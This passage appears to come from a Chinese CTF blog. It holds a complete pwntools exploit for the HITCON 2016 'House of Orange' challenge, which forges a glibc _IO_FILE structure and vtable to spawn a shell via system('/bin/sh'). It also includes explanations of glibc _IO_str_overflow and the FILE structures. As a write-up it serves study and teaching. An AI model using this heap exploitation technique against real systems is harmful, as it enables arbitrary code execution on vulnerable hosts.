class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&apos;/opt/glibc-2.24/lib/ld-linux-x86-64.so.2&apos;</span>,<span class="string">&apos;--library-path&apos;</span>,<span class="string">&apos;/opt/glibc-2.24/lib/&apos;</span>,<span class="string">&apos;./houseoforange&apos;</span>])</span><br><span class="line">elf = ELF(<span class="string">&apos;./houseoforange&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;/opt/glibc-2.24/lib/libc-2.24.so&apos;</span>)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context(log_level = <span class="string">&apos;debug&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">&apos;&apos;</span>)</span>:</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	raw_input(a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice : &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Length of name :&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Name :&apos;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Price of Orange:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Color of Orange:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Finish&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice :&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice :&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Length of name :&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Name:&apos;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Price of Orange: &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Color of Orange: &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Finish&apos;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#step1. alter the top chunk&apos;s size</span></span><br><span class="line">	build(<span class="number">0x10</span>,<span class="string">&apos;aaaa&apos;</span>)</span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*<span class="number">0x18</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xfa1</span>)</span><br><span class="line">	upgrade(<span class="number">0x100</span>,payload)</span><br><span class="line">	build(<span class="number">0x1000</span>,<span class="string">&apos;cccccccc&apos;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#step2. leak the address of libc</span></span><br><span class="line">	build(<span class="number">0x400</span>,<span class="string">&apos;aaaaaaaa&apos;</span>)	<span class="comment">#chunk*</span></span><br><span class="line">	see()</span><br><span class="line">	p.recvuntil(<span class="string">&apos;a&apos;</span>*<span class="number">8</span>)</span><br><span class="line">	addr = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))</span><br><span class="line">	libc_base = addr - <span class="number">1640</span> - <span class="number">0x398b00</span></span><br><span class="line">	log.success(<span class="string">&apos;libc_base:&apos;</span>+hex(libc_base))</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;system_addr: &apos;</span>+hex(system_addr))</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#step3. calc the addr</span></span><br><span class="line">	binsh_addr = libc_base + next(libc.search(<span class="string">&apos;/bin/sh\x00&apos;</span>))</span><br><span class="line">	log.success(<span class="string">&apos;binsh_addr: &apos;</span>+hex(binsh_addr))</span><br><span class="line">	_IO_list_all_addr = libc_base+libc.symbols[<span class="string">&apos;_IO_list_all&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;_IO_list_all_addr: &apos;</span>+hex(_IO_list_all_addr))</span><br><span class="line">	_IO_str_jumps = libc_base + libc.symbols[<span class="string">&apos;_IO_str_jumps&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;_IO_str_jumps:&apos;</span>+hex(_IO_str_jumps))</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*<span class="number">0x400</span></span><br><span class="line">	payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>)+p64(<span class="number">0</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">from</span> FILE <span class="keyword">import</span> *</span><br><span class="line">	context.arch = <span class="string">&apos;amd64&apos;</span></span><br><span class="line">	fake_file = IO_FILE_plus_struct()</span><br><span class="line">	fake_file._flags = <span class="number">0</span></span><br><span class="line">	fake_file._IO_read_ptr = <span class="number">0x61</span></span><br><span class="line">	fake_file._IO_read_base =  _IO_list_all_addr<span class="number">-0x10</span></span><br><span class="line">	fake_file._IO_write_base = <span class="number">0</span></span><br><span class="line">	fake_file._IO_write_ptr = <span class="number">1</span></span><br><span class="line">	fake_file._IO_buf_base = binsh_addr</span><br><span class="line">	fake_file._mode = <span class="number">0</span></span><br><span class="line">	fake_file.vtable = _IO_str_jumps<span class="number">-0x8</span></span><br><span class="line">	payload += str(fake_file).ljust(<span class="number">0xe8</span>,<span class="string">&apos;\x00&apos;</span>)</span><br><span class="line">	payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">	upgrade(<span class="number">0x800</span>,payload)	</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice : &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
<h2 id="0x03-&#x5229;&#x7528;-IO-file-jumps-&#x865A;&#x8868;&#x4E2D;&#x7684;-IO-str-overflow-&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5229;&#x7528;"><a href="#0x03-&#x5229;&#x7528;-IO-file-jumps-&#x865A;&#x8868;&#x4E2D;&#x7684;-IO-str-overflow-&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5229;&#x7528;" class="headerlink" title="0x03 &#x5229;&#x7528; _IO_file_jumps &#x865A;&#x8868;&#x4E2D;&#x7684; _IO_str_overflow &#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5229;&#x7528;"></a>0x03 &#x5229;&#x7528; _IO_file_jumps &#x865A;&#x8868;&#x4E2D;&#x7684; _IO_str_overflow &#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5229;&#x7528;</h2><p> <code>_IO_str_overflow</code>&#x7684;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    {</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    }</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	{</span><br><span class="line">	  <span class="keyword">char</span> *new_buf;</span><br><span class="line">	  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass &#x4E00;&#x822C;&#x4F1A;&#x901A;&#x8FC7;</span></span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf</span><br><span class="line">	    = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//target [fp+0xe0]</span></span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    {</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    }</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    {</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&apos;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    }</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&apos;\0&apos;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	}</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">}</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>
<h2 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h2><p><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/03/27/2016-Hitcon-House-of-Orange/">2016-Hitcon-House_of_Orange</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-27</time><div class="content"><p>House_of_Orangede &#x662F;&#x6765;&#x81EA;Hitcon CTF 2016&#x4E2D;&#x7684;&#x4E00;&#x9053;&#x540C;&#x540D;&#x9898;&#x76EE;&#xFF0C;&#x662F;&#x4E00;&#x79CD;&#x901A;&#x8FC7;unstoredbin attack&#x4FEE;&#x6539;<code>_IO_list_all</code>&#x6307;&#x9488;&#xFF0C;&#x4F2A;&#x9020;<code>_IO_FILE_plus</code>&#x7ED3;&#x6784;&#x4F53;&#x548C;<code>vtable</code>&#x865A;&#x8868;&#xFF0C;&#x8FDB;&#x800C;&#x4FEE;&#x6539;&#x865A;&#x8868;&#x51FD;&#x6570;&#x52AB;&#x6301;&#x63A7;&#x5236;&#x6D41;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;glibc&#x5728;2.24&#x7248;&#x672C;&#x540E;&#x52A0;&#x5165;&#x4E86;&#x5BF9;&#x865A;&#x8868;&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;&#x8FD9;&#x9898;&#x7528;&#x7684;glibc&#x7248;&#x672C;&#x662F;2.23&#xFF0C;&#x8FD8;&#x6CA1;&#x6709;&#x865A;&#x8868;&#x76F8;&#x5173;&#x7684;&#x5B89;&#x5168;&#x68C0;&#x67E5;&#x3002;</p>
<p>&#x7F51;&#x4E0A;&#x5173;&#x4E8E;House of Orange&#x7684;&#x8D44;&#x6599;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x6211;&#x5C31;&#x4ECE;&#x53E6;&#x4E00;&#x4E2A;&#x89D2;&#x5EA6;&#x6765;&#x8BB2;&#x4E00;&#x4E0B;&#x6211;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x548C;&#x77E5;&#x8BC6;&#x70B9;&#x3002;</p>
<h2 id="0x00-FILE&#x3001;-IO-FILE&#x3001;-IO-FILE-plus&#x3001;-IO-list-all&#x3001;vtable&#x662F;&#x4EC0;&#x4E48;"><a href="#0x00-FILE&#x3001;-IO-FILE&#x3001;-IO-FILE-plus&#x3001;-IO-list-all&#x3001;vtable&#x662F;&#x4EC0;&#x4E48;" class="headerlink" title="0x00 FILE&#x3001;_IO_FILE&#x3001;_IO_FILE_plus&#x3001;_IO_list_all&#x3001;vtable&#x662F;&#x4EC0;&#x4E48;"></a>0x00 FILE&#x3001;_IO_FILE&#x3001;_IO_FILE_plus&#x3001;_IO_list_all&#x3001;vtable&#x662F;&#x4EC0;&#x4E48;</h2><p>FILE &#x5728; Linux &#x7CFB;&#x7EDF;&#x7684;&#x6807;&#x51C6; IO &#x5E93;&#x4E2D;&#x662F;&#x7528;&#x4E8E;&#x63CF;&#x8FF0;&#x6587;&#x4EF6;&#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x79F0;&#x4E3A;&#x6587;&#x4EF6;&#x6D41;&#x3002; FILE &#x7ED3;&#x6784;&#x5728;&#x7A0B;&#x5E8F;&#x6267;&#x884C; fopen &#x7B49;&#x51FD;&#x6570;&#x65F6;&#x4F1A;&#x8FDB;&#x884C;&#x521B;&#x5EFA;&#xFF0C;&#x5E76;&#x5206;&#x914D;&#x5728;&#x5806;&#x4E2D;&#x3002;FILE &#x7ED3;&#x6784;&#x5B9A;&#x4E49;&#x5728; libio.h &#x4E2D;&#xFF0C;&#x7ED3;&#x6784;&#x4F53;&#x540D;&#x4E3A;<code>_IO_FILE</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> {</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span> <span class="comment">/* offset 0x68 (64bits) */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&apos;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE <span class="comment">//&#x5F00;&#x59CB;&#x5B8F;&#x5224;&#x65AD;&#xFF08;&#x8FD9;&#x6BB5;&#x5224;&#x65AD;&#x7ED3;&#x679C;&#x4E3A;&#x5426;&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x5B9A;&#x4E49;_IO_FILE_complete&#xFF0C;&#x4E0B;&#x9762;&#x8FD8;&#x662F;_IO_FILE&#xFF09;</span></span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//&#x7ED3;&#x675F;&#x5B8F;&#x5224;&#x65AD;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001 <span class="comment">//&#x4F9D;&#x7136;&#x662F;_IO_FILE&#x7684;&#x5185;&#x5BB9;</span></span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&apos;t get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">};</span><br></pre></td></tr></table></figure></p>
<p><code>_IO_FILE_plus</code>&#x5404;&#x9879;&#x504F;&#x79FB;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE_plus = {</span><br><span class="line">	<span class="string">&apos;i386&apos;</span>:{</span><br><span class="line">		<span class="number">0x0</span>:<span class="string">&apos;_flags&apos;</span>,</span><br><span class="line">		<span class="number">0x4</span>:<span class="string">&apos;_IO_read_ptr&apos;</span>,</span><br><span class="line">		<span class="number">0x8</span>:<span class="string">&apos;_IO_read_end&apos;</span>,</span><br><span class="line">		<span class="number">0xc</span>:<span class="string">&apos;_IO_read_base&apos;</span>,</span><br><span class="line">		<span class="number">0x10</span>:<span class="string">&apos;_IO_write_base&apos;</span>,</span><br><span class="line">		<span class="number">0x14</span>:<span class="string">&apos;_IO_write_ptr&apos;</span>,</span><br><span class="line">		<span class="number">0x18</span>:<span class="string">&apos;_IO_write_end&apos;</span>,</span><br><span class="line">		<span class="number">0x1c</span>:<span class="string">&apos;_IO_buf_base&apos;</span>,</span><br><span class="line">		<span class="number">0x20</span>:<span class="string">&apos;_IO_buf_end&apos;</span>,</span><br><span class="line">		<span class="number">0x24</span>:<span class="string">&apos;_IO_save_base&apos;</span>,</span><br><span class="line">		<span class="number">0x28</span>:<span class="string">&apos;_IO_backup_base&apos;</span>,</span><br><span class="line">		<span class="number">0x2c</span>:<span class="string">&apos;_IO_save_end&apos;</span>,</span><br><span class="line">		<span class="number">0x30</span>:<span class="string">&apos;_markers&apos;</span>,</span><br><span class="line">		<span class="number">0x34</span>:<span class="string">&apos;_chain&apos;</span>,</span><br><span class="line">		<span class="number">0x38</span>:<span class="string">&apos;_fileno&apos;</span>,</span><br><span 